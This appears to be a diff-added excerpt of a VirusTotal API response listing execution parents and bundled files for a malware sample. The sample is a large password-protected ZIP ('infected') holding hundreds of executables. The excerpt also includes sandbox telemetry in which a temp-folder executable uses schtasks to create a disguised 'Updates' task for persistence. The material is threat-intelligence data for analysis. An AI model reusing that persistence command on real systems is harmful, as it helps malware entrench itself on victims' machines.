+                                        "Description": "Task Scheduler Configuration Tool",
+                                        "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
+                                        "ParentCommandLine": "C:\\Users\\george\\AppData\\Local\\Temp\\nhlbayvi.m2v\\00f133fc351cb2914a8bb042966a2ea8a9b15aa7ada6d91dac19409d72f707e2.exe",
+                                        "CommandLine": "\"C:\\Windows\\System32\\schtasks.exe\" /Create /TN \"Updates\\thSSllNzKC\" /XML \"C:\\Users\\george\\AppData\\Local\\Temp\\tmp6CBC.tmp\"",
+                                        "EventID": "1",
+                                        "ParentImage": "C:\\Users\\george\\AppData\\Local\\Temp\\nhlbayvi.m2v\\00f133fc351cb2914a8bb042966a2ea8a9b15aa7ada6d91dac19409d72f707e2.exe",
+                                        "IntegrityLevel": "High",
+                                        "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
+                                        "Company": "Microsoft Corporation"
+                                    }
+                                }
+                            ]
+                        }
+                    ],
+                    "sha256": "5695a75d96e56497ab5f7175d5c1da59a4565df668cb89db774eefbb5bfb6cf5",
+                    "magic": "Zip archive data, at least v2.0 to extract, compression method=deflate",
+                    "trid": [
+                        {
+                            "file_type": "ZIP compressed archive",
+                            "probability": 100
+                        }
+                    ],
+                    "tags": [
+                        "checks-network-adapters"
+                    ],
+                    "sha1": "a35c1ae86ff0aa50fb2b1e941c9b35f711c354bd",
+                    "sigma_analysis_stats": {
+                        "critical": 1,
+                        "high": 1,
+                        "medium": 7,
+                        "low": 3
+                    },
+                    "total_votes": {
+                        "harmless": 0,
+                        "malicious": 1
+                    },
+                    "last_analysis_stats": {
+                        "malicious": 2,
+                        "suspicious": 0,
+                        "undetected": 62,
+                        "harmless": 0,
+                        "timeout": 0,
+                        "confirmed-timeout": 1,
+                        "failure": 0,
+                        "type-unsupported": 9
+                    },
+                    "md5": "eea227737face033b823122d906dabed",
+                    "size": 314096985,
+                    "last_analysis_results": {
+                        "Bkav": {
+                            "method": "blacklist",
+                            "engine_name": "Bkav",
+                            "engine_version": "2.0.0.1",
+                            "engine_update": "20250404",
+                            "category": "undetected",
+                            "result": null
+                        },
+                        "Lionic": {
+                            "method": "blacklist",
+                            "engine_name": "Lionic",
+                            "engine_version": "8.16",
+                            "engine_update": "20250404",
+                            "category": "undetected",
+                            "result": null
+                        },
+                        "MicroWorld-eScan": {
+                            "method": "blacklist",
+                            "engine_name": "MicroWorld-eScan",
+                            "engine_version": "14.0.409.0",
+                            "engine_update": "20250404",
+                            "category": "undetected",
+                            "result": null
+                        },
+                        "👉 ... (71 more keys omitted)": "..."
+                    },
+                    "first_submission_date": 1716514299,
+                    "type_description": "ZIP",
+                    "sigma_analysis_summary": {
+                        "Joe Security Rule Set (GitHub)": {
+                            "critical": 1,
+                            "high": 0,
+                            "medium": 0,
+                            "low": 0
+                        },
+                        "Sigma Integrated Rule Set (GitHub)": {
+                            "critical": 0,
+                            "high": 1,
+                            "medium": 7,
+                            "low": 3
+                        }
+                    },
+                    "type_tags": [
+                        "compressed"
+                    ],
+                    "unique_sources": 1,
+                    "bundle_info": {
+                        "highest_datetime": "2023-09-05 00:09:30",
+                        "lowest_datetime": "2023-09-05 00:00:04",
+                        "num_children": 465,
+                        "extensions": {
+                            "r01": 1,
+                            "rtf": 1,
+                            "hta": 2,
+                            "jar": 1,
+                            "apk": 2,
+                            "rar": 3,
+                            "lnk": 1,
+                            "ps1": 1,
+                            "7z": 2,
+                            "zip": 14,
+                            "unknown": 11,
+                            "ppam": 1,
+                            "elf": 130,
+                            "dll": 1,
+                            "html": 1,
+                            "xlsx": 4,
+                            "xlsm": 1,
+                            "docm": 1,
+                            "bat": 4,
+                            "exe": 262,
+                            "img": 1,
+                            "ace": 1,
+                            "wsf": 1,
+                            "doc": 14,
+                            "cmd": 1,
+                            "sh": 1,
+                            "iso": 1,
+                            "pdf": 1
+                        },
+                        "file_types": {
+                            "Portable Executable": 1
+                        },
+                        "password": "infected",
+                        "type": "ZIP",
+                        "uncompressed_size": 401088475
+                    },
+                    "vhash": "8b78a6abf6d2d57e8589b5cf56b925d0",
+                    "ssdeep": "6291456:QH0GuwBg8s1enBP7CXaDOl7R0Y/2f9Jzwnq92kYqYnLxyRPI:QK8UenRLK2fDz3bWn1yFI",
+                    "last_analysis_date": 1743811716,
+                    "times_submitted": 1,
+                    "magika": "ZIP",
+                    "crowdsourced_ids_results": [
+                        {
+                            "rule_category": "attempted-recon",
+                            "alert_severity": "medium",
+                            "rule_msg": "(icmp4) ICMP destination unreachable communication with destination host is administratively prohibited",
+                            "rule_id": "116:442",
+                            "rule_source": "Snort registered user ruleset",
+                            "rule_url": "https://www.snort.org/downloads/#rule-downloads",
+                            "rule_raw": "alert ( gid:116; sid:442; rev:2; msg:\"(icmp4) ICMP destination unreachable communication with destination host is administratively prohibited\"; metada... (truncated, total len: 199)",
+                            "alert_context": [
+                                {
+                                    "src_ip": "38.173.126.135"
+                                }
+                            ]
+                        }
+                    ],
+                    "type_extension": "zip"
+                }
+            }
+        ],
+        "meta": {
+            "count": 1
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/execution_parents?limit=10"
+        }
+    },
+    "pe_resource_parents": {
+        "data": [],
+        "meta": {
+            "count": 0
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/pe_resource_parents?limit=10"
+        }
+    },
+    "bundled_files": {
+        "data": [
+            {
+                "id": "13d8ff9e20618483ca13df41ba84f03e2077b19bd91d2e663f5f45fb40581009",
+                "type": "file",
+                "links": {
+                    "self": "https://www.virustotal.com/ui/files/13d8ff9e20618483ca13df41ba84f03e2077b19bd91d2e663f5f45fb40581009"
+                },
+                "attributes": {
+                    "type_description": "HTML",
+                    "last_analysis_results": {
+                        "Bkav": {
+                            "method": "blacklist",
+                            "engine_name": "Bkav",
+                            "engine_version": "2.0.0.1",
+                            "engine_update": "20230807",
+                            "category": "undetected",
+                            "result": null
+                        },
+                        "Lionic": {
+                            "method": "blacklist",
+                            "engine_name": "Lionic",
+                            "engine_version": "7.5",
+                            "engine_update": "20230807",
+                            "category": "undetected",
+                            "result": null
+                        },
+                        "DrWeb": {
+                            "method": "blacklist",
+                            "engine_name": "DrWeb",
+                            "engine_version": "7.0.60.6220",
+                            "engine_update": "20230807",
+                            "category": "undetected",
+                            "result": null
+                        },
+                        "👉 ... (72 more keys omitted)": "..."
+                    },
+                    "last_modification_date": 1758681695,
+                    "type_tags": [
+                        "internet"
+                    ],
+                    "total_votes": {
+                        "harmless": 0,
+                        "malicious": 0
+                    },
+                    "type_extension": "html",
+                    "md5": "7d3c9ec7e60626f60098600617a56812",
+                    "meaningful_name": "Index.hhk",
+                    "times_submitted": 1,
+                    "first_submission_date": 1691414251,
+                    "type_tag": "html",
+                    "reputation": 0,
+                    "sha256": "13d8ff9e20618483ca13df41ba84f03e2077b19bd91d2e663f5f45fb40581009",
+                    "tags": [
+                        "html"
+                    ],
+                    "trid": [
+                        {
+                            "file_type": "HyperText Markup Language with DOCTYPE",
+                            "probability": 80.6
+                        }
+                    ],
+                    "tlsh": "T1F1E06156FC9BCF314D3D6031883160E410298D52B21868CC50EC7D3317FC6A4DC5545D",
+                    "last_submission_date": 1691414251,
+                    "last_analysis_date": 1691414251,
+                    "last_analysis_stats": {
+                        "malicious": 0,
+                        "suspicious": 0,
+                        "undetected": 59,
+                        "harmless": 0,
+                        "timeout": 0,
+                        "confirmed-timeout": 0,
+                        "failure": 0,
+                        "type-unsupported": 16
+                    },
+                    "magic": "HTML document, ASCII text, with CRLF line terminators",
+                    "size": 403,
+                    "sha1": "93161ed7c2c23d7f63b7132a60861421342780e9",
+                    "unique_sources": 1,
+                    "names": [
+                        "Index.hhk"
+                    ],
+                    "ssdeep": "12:J04pcK9wlY1o1b9KMhSZA4H4Wq3Kt2X5HH:XvnQKMRzn"
+                }
+            }
+        ],
+        "meta": {
+            "count": 15,
+            "cursor": "MTB8fHYzfHwxNzY2NTQ0MDQyfHw4YzNkMDhlYjdhNzk0YjEzMzFlMmE0NDA3MDJkZmJhMmU1M2JhNGQ2OTdjZDEyODA4NDliYjI4ZmMxYjNhMDgw"
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/bundled_files?limit=10",
+            "next": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/bundled_files?limit=10&cursor=MTB8fHYzfHwxNzY2NTQ... (truncated, total len: 243)"
+        }
+    },
+    "pe_resource_children": {
+        "data": [],
+        "meta": {
+            "count": 0
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/pe_resource_children?limit=10"
+        }
+    }
+}
